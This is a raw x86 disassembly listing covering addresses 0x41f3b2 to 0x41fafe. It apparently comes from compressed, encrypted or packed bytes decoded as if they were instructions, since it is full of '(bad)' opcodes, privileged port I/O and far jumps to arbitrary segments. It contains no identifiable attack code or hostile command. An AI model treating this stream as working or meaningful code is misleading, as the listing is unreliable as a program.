  41f3b2:	dec    edi
  41f3b3:	(bad)  
  41f3b4:	out    dx,eax
  41f3b5:	pusha  
  41f3b6:	add    DWORD PTR [eax],esi
  41f3b8:	jg     0x41f3bd
  41f3ba:	jmp    0xeeaeb788
  41f3bf:	push   edx
  41f3c0:	iret   
  41f3c1:	or     BYTE PTR ds:0x5ca4d488,dl
  41f3c7:	fld    DWORD PTR [eax+0x111aeb7e]
  41f3cd:	fs js  0x41f3e2
  41f3d0:	lahf   
  41f3d1:	dec    ebx
  41f3d2:	jno    0x41f435
  41f3d4:	sbb    bl,bh
  41f3d6:	lea    ebx,ds:[esi-0x40]
  41f3da:	fnsave [ebx-0x545ac905]
  41f3e0:	bnd jp 0x41f433
  41f3e3:	or     al,BYTE PTR [ecx+0x55939560]
  41f3e9:	pop    esi
  41f3ea:	sbb    DWORD PTR [edi+0x7deb9cf4],esi
  41f3f0:	xor    bl,dh
  41f3f2:	aad    0xbe
  41f3f4:	mov    eax,ds:0x6143a328
  41f3fa:	test   cl,dl
  41f3fc:	cmovnp eax,DWORD PTR [ecx]
  41f3ff:	dec    edi
  41f400:	mov    bh,0x24
  41f402:	out    dx,al
  41f403:	dec    edi
  41f404:	adc    bl,BYTE PTR [esi+0x3ed96137]
  41f40a:	cmp    edi,DWORD PTR [ebp-0x5453e3be]
  41f410:	mov    dl,0x27
  41f412:	outs   dx,BYTE PTR ds:[esi]
  41f413:	pop    esi
  41f414:	pop    ds
  41f415:	xchg   ebx,eax
  41f416:	test   DWORD PTR [ecx+ebp*1],ebx
  41f419:	push   eax
  41f41a:	out    dx,al
  41f41b:	inc    esi
  41f41c:	mov    ah,cl
  41f41e:	das    
  41f41f:	mov    esp,0xa3cb2d61
  41f424:	add    eax,0xfdfdadbb
  41f429:	out    0x96,al
  41f42b:	rol    esp,1
  41f42d:	sub    bl,ch
  41f42f:	rol    DWORD PTR [edi],cl
  41f431:	sbb    BYTE PTR [ebp+0x37],al
  41f434:	or     BYTE PTR [ecx+0x61048882],bh
  41f43a:	xchg   edx,eax
  41f43b:	jae    0x41f3e7
  41f43d:	rcr    BYTE PTR [esi],0x33
  41f440:	arpl   WORD PTR [esi+ebp*8+0x5716f8a8],cx
  41f447:	leave  
  41f448:	mul    DWORD PTR [ebp+0x46d9c9e]
  41f44e:	test   bl,dl
  41f450:	xchg   ecx,eax
  41f451:	pusha  
  41f452:	add    bh,dh
  41f454:	jb     0x41f4d2
  41f456:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f458:	lahf   
  41f459:	int3   
  41f45a:	mov    bl,0x28
  41f45c:	test   eax,0x65983460
  41f461:	ds pop ecx
  41f463:	jmp    0x41f4c3
  41f465:	cli    
  41f466:	test   al,0x1f
  41f468:	sbb    esi,esp
  41f46a:	mov    al,ds:0xce610d73
  41f46f:	inc    ebp
  41f470:	sti    
  41f471:	and    cl,BYTE PTR [esi+0x2332571c]
  41f477:	jns    0x41f4ed
  41f479:	loopne 0x41f4cb
  41f47b:	mov    edx,0xe09f7b2
  41f480:	adc    DWORD PTR [edx-0x4f],0xeeeac6f6
  41f487:	or     ebx,esp
  41f489:	into   
  41f48a:	div    DWORD PTR [ebx+0x70ee176c]
  41f490:	or     bl,BYTE PTR [esi]
  41f492:	and    eax,0x437ad4b
  41f497:	mov    eax,ds:0xa08de1a2
  41f49c:	es push esi
  41f49e:	(bad)  
  41f49f:	neg    DWORD PTR [ebx-0x9]
  41f4a2:	jae    0x41f449
  41f4a4:	(bad)  
  41f4a5:	popf   
  41f4a6:	push   ds
  41f4a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4a8:	adc    eax,0x71a187a6
  41f4ad:	in     al,0x75
  41f4af:	xor    DWORD PTR [ebx-0x3],edx
  41f4b2:	add    eax,0x9bc5e1f
  41f4b7:	cmp    esp,DWORD PTR [esi-0x60]
  41f4ba:	push   ecx
  41f4bb:	push   0x8ae8609f
  41f4c0:	pusha  
  41f4c1:	(bad)  [edx+0x4f]
  41f4c4:	push   ebx
  41f4c5:	shr    esi,cl
  41f4c7:	adc    BYTE PTR [eax+eiz*1+0x16],bh
  41f4cb:	pop    es
  41f4cc:	push   esp
  41f4cd:	outs   dx,DWORD PTR ds:[esi]
  41f4ce:	mov    ebp,0xeeffc2dc
  41f4d3:	in     al,dx
  41f4d4:	mov    BYTE PTR [edi-0xe],ah
  41f4d7:	mov    al,0xda
  41f4d9:	push   eax
  41f4da:	in     eax,dx
  41f4db:	iret   
  41f4dc:	pop    ebp
  41f4dd:	sbb    BYTE PTR [ebp+edx*1+0x65],0x33
  41f4e2:	bound  ebx,QWORD PTR [eax+0x7727609c]
  41f4e8:	mov    dl,0xb6
  41f4ea:	jl     0x41f4a4
  41f4ec:	jno    0x41f51d
  41f4ee:	out    dx,al
  41f4ef:	mov    BYTE PTR [ebx+0x428556ba],bh
  41f4f5:	(bad)  
  41f4f6:	call   0x552c:0x1b9af1a1
  41f4fd:	ins    DWORD PTR es:[edi],dx
  41f4fe:	and    eax,DWORD PTR [ebx*2-0x2a281aed]
  41f505:	jmp    0x41f535
  41f507:	mov    edx,DWORD PTR [esi-0x1658257b]
  41f50d:	in     eax,dx
  41f50e:	jmp    0x41f54c
  41f510:	jg     0x41f563
  41f512:	sub    eax,DWORD PTR [edx]
  41f514:	inc    edi
  41f515:	push   ds
  41f516:	sahf   
  41f517:	jl     0x41f4d9
  41f519:	mov    ebx,0x904ab7f5
  41f51e:	aam    0x20
  41f520:	aaa    
  41f521:	sbb    eax,0x615a721e
  41f526:	sbb    cl,dl
  41f528:	arpl   WORD PTR [eax-0x30],di
  41f52b:	and    BYTE PTR [edx+0x2311eeef],ch
  41f531:	ret    0xac9f
  41f534:	adc    eax,0xef79898a
  41f539:	adc    al,0xb3
  41f53b:	jae    0x41f596
  41f53d:	call   0xef4b:0x61491b99
  41f544:	outs   dx,BYTE PTR ds:[esi]
  41f545:	jno    0x41f52c
  41f547:	(bad)  
  41f548:	pop    esi
  41f549:	scas   al,BYTE PTR es:[edi]
  41f54a:	xor    ecx,DWORD PTR [ecx]
  41f54c:	cwde   
  41f54d:	test   al,0xbf
  41f54f:	test   BYTE PTR [esi],bl
  41f551:	popa   
  41f552:	ds sar edx,1
  41f555:	aas    
  41f556:	pop    es
  41f557:	ret    0x7de5
  41f55a:	out    dx,al
  41f55b:	jo     0x41f520
  41f55d:	test   BYTE PTR [edx],ch
  41f55f:	jl     0x41f5df
  41f561:	or     al,0xa2
  41f563:	mov    eax,ds:0xfb974f79
  41f568:	stos   BYTE PTR es:[di],al
  41f56a:	stc    
  41f56b:	iret   
  41f56c:	pop    ebp
  41f56d:	imul   ebx,DWORD PTR [esi+0x35e1bb4c],0x13a8a341
  41f577:	mul    dl
  41f579:	pop    ecx
  41f57a:	mov    ds:0xbba3ce6c,eax
  41f57f:	mov    al,0x63
  41f581:	add    al,0x3a
  41f583:	xchg   ecx,eax
  41f584:	pop    esi
  41f585:	dec    esp
  41f586:	mov    ah,0x14
  41f588:	cmp    DWORD PTR [ecx+0x7d],eax
  41f58b:	jbe    0x41f5d1
  41f58d:	popa   
  41f58e:	(bad)  
  41f58f:	sbb    ch,dl
  41f591:	cmc    
  41f592:	push   ss
  41f593:	stos   BYTE PTR es:[edi],al
  41f594:	fsubr  st,st(0)
  41f596:	out    dx,al
  41f597:	mov    ebp,0xb86cc43a
  41f59c:	lods   al,BYTE PTR ds:[esi]
  41f59d:	(bad)  
  41f59e:	push   edi
  41f59f:	mov    eax,ds:0xd3127f5c
  41f5a4:	or     esp,eax
  41f5a6:	ret    0x5e8d
  41f5a9:	push   ebx
  41f5aa:	dec    ebp
  41f5ab:	nop
  41f5ac:	sbb    al,BYTE PTR [edi*2-0x2f9eb85d]
  41f5b3:	ret    
  41f5b4:	pop    ss
  41f5b5:	jmp    0x41f62e
  41f5b7:	stos   BYTE PTR es:[edi],al
  41f5b8:	out    dx,eax
  41f5b9:	lds    ecx,FWORD PTR [eax]
  41f5bb:	clc    
  41f5bc:	dec    eax
  41f5bd:	pop    ebp
  41f5be:	jmp    0x2e968f70
  41f5c3:	pusha  
  41f5c4:	daa    
  41f5c5:	ds push ds
  41f5c7:	mov    eax,ds:0xf15d6c12
  41f5cc:	mov    al,ds:0x5ed6591b
  41f5d1:	ins    DWORD PTR es:[edi],dx
  41f5d2:	sbb    ecx,DWORD PTR [edx+0x3c]
  41f5d5:	mov    ds:0x5ebdc450,eax
  41f5da:	ss hlt 
  41f5dc:	outs   dx,DWORD PTR ds:[esi]
  41f5dd:	cmp    eax,0xa0f3df2e
  41f5e2:	add    DWORD PTR ds:0x9a8a5990,eax
  41f5e8:	xchg   BYTE PTR [edx-0x5a],bh
  41f5eb:	add    DWORD PTR [eax],eax
  41f5ed:	xchg   ebp,eax
  41f5ee:	psraw  mm6,QWORD PTR [eax-0x5b]
  41f5f2:	(bad)  
  41f5f4:	hlt    
  41f5f5:	out    0xfa,eax
  41f5f7:	mov    ebp,0xa439a334
  41f5fc:	pop    ebx
  41f5fd:	mov    eax,0x5ea1618e
  41f602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f603:	inc    eax
  41f604:	sub    eax,0xdec114b9
  41f609:	jmp    0x190c0be0
  41f60e:	pop    ebx
  41f60f:	rcl    DWORD PTR [eax+0x4c8ee2c],0xd4
  41f616:	sbb    dh,al
  41f618:	xlat   BYTE PTR ds:[ebx]
  41f619:	inc    ebp
  41f61a:	scas   al,BYTE PTR es:[edi]
  41f61b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f61c:	xor    cl,BYTE PTR [esi+0x1ff2fe4d]
  41f622:	pop    edi
  41f623:	jge    0x41f5fd
  41f625:	xor    BYTE PTR [edi+0xe3f5ede],dh
  41f62b:	fwait
  41f62c:	dec    ebx
  41f62d:	push   ecx
  41f62e:	mov    eax,ds:0x4260f352
  41f633:	xlat   BYTE PTR ds:[ebx]
  41f634:	out    dx,eax
  41f635:	clc    
  41f636:	cmp    esi,DWORD PTR [ebx+0x6dee36d8]
  41f63c:	add    BYTE PTR [ebp+0x7a],0x20
  41f640:	cmc    
  41f641:	cld    
  41f642:	(bad)  
  41f643:	mov    al,ds:0x97a89ce1
  41f648:	jp     0x41f68a
  41f64a:	and    DWORD PTR [edi],ecx
  41f64c:	pop    esi
  41f64d:	in     al,dx
  41f64e:	push   es
  41f64f:	push   ebx
  41f650:	mul    DWORD PTR [edx]
  41f652:	mov    bl,0xa7
  41f654:	push   esp
  41f655:	popa   
  41f656:	mov    esp,0x6d36191e
  41f65b:	jecxz  0x41f5ee
  41f65d:	jno    0x41f64d
  41f65f:	mov    ebp,ecx
  41f661:	lods   al,BYTE PTR ds:[esi]
  41f662:	aas    
  41f663:	pop    edx
  41f664:	cmp    edi,DWORD PTR [ebp-0x76]
  41f667:	mov    eax,ds:0xf26a22e0
  41f66c:	mov    cl,0xc4
  41f66e:	imul   eax,esp,0x6674495a
  41f674:	dec    edi
  41f675:	adc    DWORD PTR [ebp+0x0],ebp
  41f678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f679:	mov    al,0x41
  41f67b:	xchg   edx,eax
  41f67c:	xchg   DWORD PTR [eax+0x4233700a],ecx
  41f682:	or     eax,0xf3613507
  41f687:	jmp    FWORD PTR [ebx+0x5e756e2e]
  41f68d:	lock cmp esi,eax
  41f690:	jbe    0x41f6eb
  41f692:	add    edx,DWORD PTR [ecx]
  41f694:	pushf  
  41f695:	pusha  
  41f696:	shl    DWORD PTR [edi+0x6e],0x34
  41f69a:	jecxz  0x41f6cb
  41f69c:	sbb    BYTE PTR ds:0x5f0488ff,cl
  41f6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6a3:	sbb    eax,0x4d4e6477
  41f6a8:	test   eax,0xa38ce580
  41f6ad:	inc    esi
  41f6ae:	xchg   DWORD PTR [ecx-0x19],esp
  41f6b1:	fnsave [ecx-0x1140ac14]
  41f6b7:	fwait
  41f6b8:	data16 jno 0x41f6f5
  41f6bb:	sub    bh,BYTE PTR [ecx-0x405ea1c2]
  41f6c1:	dec    eax
  41f6c2:	stc    
  41f6c3:	nop
  41f6c4:	jp     0x41f6af
  41f6c6:	fsubr  st,st(2)
  41f6c8:	pop    ebx
  41f6c9:	test   eax,0x9067d9c0
  41f6ce:	sahf   
  41f6cf:	push   es
  41f6d0:	adc    dh,bl
  41f6d2:	js     0x41f675
  41f6d4:	xchg   DWORD PTR [ebp+0x59],esi
  41f6d7:	bound  edx,QWORD PTR [edx+edx*4+0x41]
  41f6db:	aad    0xf6
  41f6dd:	(bad)  
  41f6de:	lock into 
  41f6e0:	lods   al,BYTE PTR ds:[esi]
  41f6e1:	adc    BYTE PTR [eax+0x475b10a0],dh
  41f6e7:	mov    cl,BYTE PTR [edi]
  41f6e9:	popa   
  41f6ea:	mov    DWORD PTR [edi],edi
  41f6ec:	xchg   DWORD PTR [edx],ebp
  41f6ee:	sub    dh,ah
  41f6f0:	or     ecx,esp
  41f6f2:	in     al,0x4e
  41f6f4:	pop    edi
  41f6f5:	ds xchg esp,eax
  41f6f7:	mov    dh,0x8e
  41f6f9:	mov    ah,0x1f
  41f6fb:	mov    ss,WORD PTR [eax-0x5cf2501f]
  41f701:	mov    al,ds:0x8dfe8eea
  41f706:	dec    eax
  41f707:	jb     0x41f767
  41f709:	(bad)  
  41f70a:	repz aam 0x18
  41f70d:	add    al,0xad
  41f70f:	sub    DWORD PTR [eax+eiz*2+0x2c653d6f],edx
  41f716:	jne    0x41f71c
  41f718:	mov    fs,WORD PTR [ebx]
  41f71a:	out    dx,eax
  41f71b:	pop    edi
  41f71c:	and    DWORD PTR [eax+0x45],edx
  41f71f:	rcl    DWORD PTR [eax+eiz*4],0x7f
  41f723:	ss ret 0x3460
  41f727:	repz xchg edx,eax
  41f729:	fsub   QWORD PTR [ebx-0x70]
  41f72c:	or     eax,0x7f81eede
  41f731:	mov    ah,0xdb
  41f733:	(bad)  
  41f734:	cmp    edi,DWORD PTR ds:0x4a05b081
  41f73a:	out    dx,al
  41f73b:	pop    esp
  41f73c:	xor    al,0x39
  41f73e:	mov    ebp,0xee131d0f
  41f743:	push   0xfffffffe
  41f745:	ss and esp,0x7
  41f749:	push   eax
  41f74a:	(bad)  
  41f74b:	mov    al,ds:0x5207ed50
  41f750:	xchg   edx,eax
  41f751:	add    DWORD PTR [esi+esi*8+0x3c],eax
  41f755:	or     dl,BYTE PTR [ebp+0x5e]
  41f758:	pop    esi
  41f759:	pop    ss
  41f75a:	push   eax
  41f75b:	jno    0x41f78e
  41f75d:	(bad)  
  41f75e:	jne    0x41f701
  41f760:	push   0x7abd8ad1
  41f765:	jae    0x41f6fc
  41f767:	mov    WORD PTR [esi+0x18],ds
  41f76a:	cmp    esi,esp
  41f76c:	xchg   esi,eax
  41f76d:	xchg   BYTE PTR [esp+eax*2+0x6d795664],dl
  41f774:	scas   eax,DWORD PTR es:[edi]
  41f775:	jp     0x41f7e5
  41f777:	inc    edi
  41f778:	mov    dh,0x7b
  41f77a:	pop    edi
  41f77b:	stc    
  41f77c:	pop    edi
  41f77d:	test   ebp,edi
  41f77f:	xlat   BYTE PTR ds:[ebx]
  41f780:	cli    
  41f781:	ins    DWORD PTR es:[edi],dx
  41f782:	and    dh,BYTE PTR [ecx]
  41f784:	loop   0x41f7cb
  41f786:	das    
  41f787:	mov    eax,ds:0x3f3b5c
  41f78c:	outs   dx,DWORD PTR ds:[esi]
  41f78d:	repnz outs dx,DWORD PTR ds:[esi]
  41f78f:	hlt    
  41f790:	pop    ebx
  41f791:	call   DWORD PTR [ebx-0x3c]
  41f794:	or     al,0xbb
  41f796:	push   cs
  41f797:	add    eax,0xa0c424c1
  41f79c:	xor    dh,BYTE PTR [esp+esi*8]
  41f79f:	out    dx,eax
  41f7a0:	inc    ebx
  41f7a1:	das    
  41f7a2:	lahf   
  41f7a3:	xor    dh,dh
  41f7a5:	push   esp
  41f7a6:	and    DWORD PTR [edx+0x6a],ebp
  41f7a9:	fbstp  TBYTE PTR [eax+esi*2+0x22]
  41f7ad:	mov    bl,0x32
  41f7af:	add    eax,0xa830f376
  41f7b4:	xor    eax,0xaed99731
  41f7b9:	push   eax
  41f7ba:	cmp    al,0x7e
  41f7bc:	xor    bh,ah
  41f7be:	out    dx,al
  41f7bf:	mov    DWORD PTR [edi],0xd6f3bec8
  41f7c5:	daa    
  41f7c6:	rol    DWORD PTR [edx+ebp*8-0x42eb01a3],1
  41f7cd:	imul   esp,DWORD PTR [ecx+0x22d4be64],0xb
  41f7d4:	pop    esi
  41f7d5:	jnp    0x41f852
  41f7d7:	popf   
  41f7d8:	shufps xmm3,XMMWORD PTR [edx+0x43608685],0xae
  41f7e0:	add    edi,DWORD PTR [ebp-0x29]
  41f7e3:	sbb    bh,BYTE PTR [ebp-0x24501199]
  41f7e9:	sub    al,dh
  41f7eb:	out    dx,al
  41f7ec:	ss pushf 
  41f7ee:	xor    ah,BYTE PTR [ecx+0x1390ef02]
  41f7f4:	loop   0x41f78d
  41f7f6:	data16 icebp 
  41f7f8:	pop    esi
  41f7f9:	mov    al,ds:0x1a920b95
  41f7fe:	into   
  41f7ff:	jae    0x41f7ee
  41f801:	mov    eax,0xfee0a0cb
  41f806:	adc    al,0xaf
  41f808:	jg     0x41f86f
  41f80a:	inc    ebx
  41f80b:	cdq    
  41f80c:	out    dx,eax
  41f80d:	hlt    
  41f80e:	out    dx,al
  41f80f:	std    
  41f810:	and    BYTE PTR [edi],dh
  41f812:	out    dx,eax
  41f813:	int3   
  41f814:	push   esi
  41f815:	shl    BYTE PTR [edi+0x13d5e0a0],cl
  41f81b:	add    BYTE PTR [edx+0x5ee7a68b],cl
  41f821:	mov    ?,WORD PTR [eax]
  41f823:	mov    ch,0xd3
  41f825:	cs mov edi,0xeb60a6be
  41f82b:	imul   esp,ebx,0xffffff9f
  41f82e:	mov    ebp,0xeea1dd45
  41f833:	pushf  
  41f834:	dec    edi
  41f835:	daa    
  41f836:	sahf   
  41f837:	sti    
  41f838:	daa    
  41f839:	xchg   esp,eax
  41f83a:	int    0xa8
  41f83c:	inc    edx
  41f83d:	push   0xffffffee
  41f83f:	jle    0x41f89d
  41f841:	cld    
  41f842:	dec    edi
  41f843:	lods   eax,DWORD PTR ds:[esi]
  41f844:	xchg   DWORD PTR [ebp-0x4e],ecx
  41f847:	and    BYTE PTR [ebx+0x5e],dl
  41f84a:	mov    al,0x16
  41f84c:	sub    al,0xf3
  41f84e:	jb     0x41f879
  41f850:	fcmovne st,st(7)
  41f852:	mov    esp,0x573e5aa0
  41f857:	jmp    0xcdd35863
  41f85c:	jg     0x41f7ea
  41f85e:	push   esi
  41f85f:	dec    esi
  41f860:	pop    esi
  41f861:	mov    BYTE PTR [eax+0x615b83b5],al
  41f867:	and    eax,0xd915aead
  41f86c:	sub    ecx,DWORD PTR [eax-0x19]
  41f86f:	iret   
  41f870:	(bad)  
  41f872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f873:	int3   
  41f874:	fidivr WORD PTR [ecx]
  41f876:	call   0x2644:0xee5f4062
  41f87d:	loop   0x41f8b9
  41f87f:	clc    
  41f880:	inc    ebp
  41f881:	add    al,BYTE PTR [edx-0x5a]
  41f884:	ja     0x41f818
  41f886:	and    BYTE PTR [eax+0x539599ad],ah
  41f88c:	mov    edi,0x8eb22ed6
  41f891:	jns    0x41f881
  41f893:	xor    eax,0xf71c5c5
  41f898:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41f89a:	sbb    DWORD PTR [ecx-0x2eb69375],esp
  41f8a0:	jae    0x41f8eb
  41f8a2:	and    al,0xd
  41f8a4:	pop    esi
  41f8a5:	or     BYTE PTR [eax-0x2c],0xd9
  41f8a9:	and    eax,0x6121d998
  41f8ae:	fcomi  st,st(6)
  41f8b0:	pushf  
  41f8b1:	ds mov edi,ebx
  41f8b4:	sbb    DWORD PTR [ebx+0x23],ecx
  41f8b7:	jecxz  0x41f854
  41f8b9:	loopne 0x41f8f1
  41f8bb:	and    dl,bh
  41f8bd:	jmp    0x41f86c
  41f8bf:	fist   WORD PTR [esi]
  41f8c1:	pusha  
  41f8c2:	pop    eax
  41f8c3:	xor    BYTE PTR [edi],al
  41f8c5:	arpl   sp,dx
  41f8c7:	out    dx,eax
  41f8c8:	xchg   ebp,eax
  41f8c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8ca:	cwde   
  41f8cb:	rcr    DWORD PTR [esi+0x10],cl
  41f8ce:	les    ecx,FWORD PTR [ecx]
  41f8d0:	rcr    ebx,1
  41f8d2:	xchg   DWORD PTR [ebx-0x4c078d44],esp
  41f8d8:	xchg   edx,eax
  41f8d9:	pusha  
  41f8da:	iret   
  41f8db:	push   ds
  41f8dc:	inc    esp
  41f8dd:	fisttp QWORD PTR [ecx+0x8405e27]
  41f8e3:	add    eax,0x67dea439
  41f8e8:	retf   0x5660
  41f8eb:	jae    0x41f8be
  41f8ed:	addr16 push ebx
  41f8ef:	mov    esi,DWORD PTR [edi-0x54f80f11]
  41f8f5:	pop    es
  41f8f6:	fld    QWORD PTR [eax]
  41f8f8:	jg     0x41f8c0
  41f8fa:	cmp    al,0xf6
  41f8fc:	mov    ch,0x21
  41f8fe:	bound  esp,QWORD PTR [ecx+0x67cb6053]
  41f904:	aam    0x66
  41f906:	fiadd  DWORD PTR [edx+0x5e]
  41f909:	int3   
  41f90a:	jge    0x41f928
  41f90c:	add    edi,edx
  41f90e:	xor    dh,bl
  41f910:	enter  0xa760,0xa5
  41f914:	jo     0x41f8a8
  41f916:	aaa    
  41f917:	stc    
  41f918:	mov    ds:0xbf0aee58,eax
  41f91d:	into   
  41f91e:	mov    esi,0xba98e4df
  41f923:	mov    al,ds:0x515f49da
  41f928:	imul   BYTE PTR ds:0x753a07cc
  41f92e:	(bad)  
  41f92f:	sub    eax,0x10d3b85b
  41f934:	imul   ebp,DWORD PTR [ebx+ebp*2],0xffffffae
  41f938:	int    0xb8
  41f93a:	push   esp
  41f93b:	fwait
  41f93c:	cmp    al,0x61
  41f93e:	loop   0x41f949
  41f940:	sahf   
  41f941:	mov    esi,0xf72c90e4
  41f946:	out    dx,al
  41f947:	push   cs
  41f948:	jmp    0xb370:0x21a5084
  41f94f:	mov    al,ds:0xf05ac8bf
  41f954:	out    0x72,al
  41f956:	or     ecx,DWORD PTR [ecx+0x5e]
  41f959:	nop
  41f95a:	dec    esi
  41f95b:	xchg   BYTE PTR [ebx+ebx*4+0x5],cl
  41f95f:	push   ss
  41f960:	add    esp,DWORD PTR [ecx+0x13]
  41f963:	stos   BYTE PTR es:[edi],al
  41f964:	cld    
  41f965:	test   DWORD PTR ds:0xee7ca006,ecx
  41f96b:	loope  0x41f9bc
  41f96d:	cmp    eax,0xdd220d5d
  41f972:	js     0x41f916
  41f974:	xchg   esi,eax
  41f975:	inc    edx
  41f976:	ja     0x41f944
  41f978:	ss push 0x74cd518f
  41f97e:	loopne 0x41f9f2
  41f980:	pop    ebx
  41f981:	cmp    BYTE PTR [eax-0xd],dh
  41f984:	fld    TBYTE PTR [esi+ebx*1]
  41f987:	int    0xc2
  41f989:	or     dl,ah
  41f98b:	xchg   esi,eax
  41f98c:	mov    bh,BYTE PTR [eax+0x4c87a0f3]
  41f992:	in     eax,0x85
  41f994:	es sub ebx,ebp
  41f997:	shl    esi,0xd1
  41f99a:	sbb    edx,DWORD PTR [ebx-0x5b]
  41f99d:	xchg   ecx,eax
  41f99e:	dec    esi
  41f99f:	push   ds
  41f9a0:	pop    eax
  41f9a1:	shl    edi,0xa0
  41f9a4:	push   cs
  41f9a5:	xor    eax,0x14a3fa59
  41f9aa:	inc    ebp
  41f9ab:	jns    0x41fa0b
  41f9ad:	loop   0x41f94d
  41f9af:	jmp    0xb35530f3
  41f9b4:	ss pop esi
  41f9b6:	jl     0x41f9c5
  41f9b8:	jae    0x41f9fc
  41f9ba:	push   ebx
  41f9bb:	xchg   edx,eax
  41f9bc:	(bad)  
  41f9bd:	fisttp QWORD PTR [eax+ecx*2]
  41f9c0:	pop    esi
  41f9c1:	arpl   WORD PTR [edx],sp
  41f9c3:	pop    eax
  41f9c4:	pop    eax
  41f9c5:	add    eax,0xf1688799
  41f9ca:	xchg   ebx,eax
  41f9cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9cc:	pushf  
  41f9cd:	or     al,al
  41f9cf:	(bad)  
  41f9d0:	aam    0x21
  41f9d2:	bound  bx,DWORD PTR [ecx+ebx*2-0x12]
  41f9d7:	xchg   ebx,eax
  41f9d8:	push   ds
  41f9d9:	sbb    DWORD PTR [esi],eax
  41f9db:	xchg   ebp,eax
  41f9dc:	cmp    ebx,DWORD PTR ds:0x8f7fa129
  41f9e2:	sbb    DWORD PTR [eax],0x20d8de6a
  41f9e8:	push   esp
  41f9e9:	sbb    dh,dh
  41f9eb:	add    eax,0xbf1b62e0
  41f9f0:	inc    ebp
  41f9f1:	inc    ecx
  41f9f2:	mov    WORD PTR [ebp-0x27c69f05],?
  41f9f8:	mov    ebp,DWORD PTR [esi-0x55]
  41f9fb:	aaa    
  41f9fc:	jmp    0x41fa43
  41f9fe:	pop    esp
  41f9ff:	retf   0xce5e
  41fa02:	add    DWORD PTR [edi],edi
  41fa04:	call   0x1f60:0x8a34eae6
  41fa0b:	xchg   edx,eax
  41fa0c:	idiv   BYTE PTR [edi+0x2110a027]
  41fa12:	out    dx,al
  41fa13:	dec    ebx
  41fa14:	xchg   ebx,eax
  41fa15:	test   eax,0x8f321ea7
  41fa1a:	inc    eax
  41fa1b:	mov    ds:0x51ed8a9a,al
  41fa20:	xor    ebx,ebp
  41fa22:	sub    edi,DWORD PTR [ecx+0x71]
  41fa25:	retf   
  41fa26:	out    dx,al
  41fa27:	mov    eax,DWORD PTR [eax+0x11]
  41fa2a:	adc    BYTE PTR [esi-0x5f002212],ch
  41fa30:	xor    al,0x7d
  41fa32:	fs push 0x60
  41fa35:	mov    ebp,0xaa123373
  41fa3a:	mov    BYTE PTR [ecx+edx*1+0x46342e46],dl
  41fa41:	pop    ecx
  41fa42:	inc    edx
  41fa43:	test   al,0x28
  41fa45:	jle    0x41fa45
  41fa47:	cs push edx
  41fa49:	adc    DWORD PTR [eax+0x5c],ebx
  41fa4c:	loop   0x41fa08
  41fa4e:	cld    
  41fa4f:	pop    es
  41fa50:	(bad)  
  41fa51:	clc    
  41fa52:	out    dx,al
  41fa53:	dec    edx
  41fa54:	stos   DWORD PTR es:[edi],eax
  41fa55:	pushf  
  41fa56:	loop   0x41fa33
  41fa58:	mov    al,0x65
  41fa5a:	jno    0x41fa2c
  41fa5c:	arpl   bp,bp
  41fa5e:	mov    al,0xb8
  41fa60:	(bad)  
  41fa62:	bswap  esi
  41fa64:	dec    eax
  41fa65:	jg     0x41fa54
  41fa67:	rol    dh,0x6b
  41fa6a:	mov    bl,0x4e
  41fa6c:	dec    edi
  41fa6d:	mov    DWORD PTR [edx],ebp
  41fa6f:	cs cwde 
  41fa71:	or     BYTE PTR [ecx],ah
  41fa73:	mov    ebx,0x20b0a353
  41fa78:	leave  
  41fa79:	ins    DWORD PTR es:[edi],dx
  41fa7a:	push   esp
  41fa7b:	xor    ebx,edi
  41fa7d:	sbb    ah,ch
  41fa7f:	(bad)  
  41fa80:	pop    ecx
  41fa81:	or     al,dl
  41fa83:	ins    DWORD PTR es:[edi],dx
  41fa84:	jo     0x41fa8e
  41fa86:	cmp    edx,DWORD PTR cs:[ecx+esi*1-0x66]
  41fa8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa8c:	dec    edi
  41fa8d:	enter  0xfe,0xb5
  41fa91:	faddp  st(6),st
  41fa93:	push   ecx
  41fa94:	and    al,0x21
  41fa96:	pop    ebp
  41fa97:	sub    al,0x5e
  41fa99:	sub    al,0x9c
  41fa9b:	jmp    0x1496:0x55967920
  41faa2:	dec    esp
  41faa3:	jae    0x41fb08
  41faa5:	sub    ah,BYTE PTR ds:0xa2471e56
  41faab:	or     al,0x16
  41faad:	dec    ebx
  41faae:	out    dx,al
  41faaf:	cli    
  41fab0:	test   edx,edx
  41fab2:	or     DWORD PTR [ebp+0x4b],esp
  41fab5:	xchg   edx,eax
  41fab6:	je     0x41fa59
  41fab8:	rol    bl,0xb6
  41fabb:	mov    dl,0x95
  41fabd:	jle    0x41fb07
  41fabf:	lahf   
  41fac0:	pop    esi
  41fac1:	xchg   DWORD PTR [ebx-0x24664a3b],eax
  41fac7:	dec    esp
  41fac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fac9:	push   edx
  41faca:	and    esp,DWORD PTR ds:0x30ae5dff
  41fad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fad1:	iret   
  41fad2:	icebp  
  41fad3:	cwde   
  41fad4:	pop    esi
  41fad5:	dec    ebp
  41fad6:	nop
  41fad7:	inc    eax
  41fad8:	sbb    esi,edi
  41fada:	or     al,0x2f
  41fadc:	ins    BYTE PTR es:[edi],dx
  41fadd:	pusha  
  41fade:	into   
  41fadf:	and    esi,ebp
  41fae1:	jno    0x41fb41
  41fae3:	imul   ebx,DWORD PTR [eax],0xffffffe8
  41fae6:	lock das 
  41fae8:	les    edx,FWORD PTR [eax+0x7e]
  41faeb:	mov    al,0xcf
  41faed:	call   0x1d1207dd
  41faf2:	mov    ds:0x10248c41,al
  41faf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faf8:	loope  0x41fb15
  41fafa:	test   al,0xf8
  41fafc:	jo     0x41fb0b
  41fafe:	jbe    0x41fb16
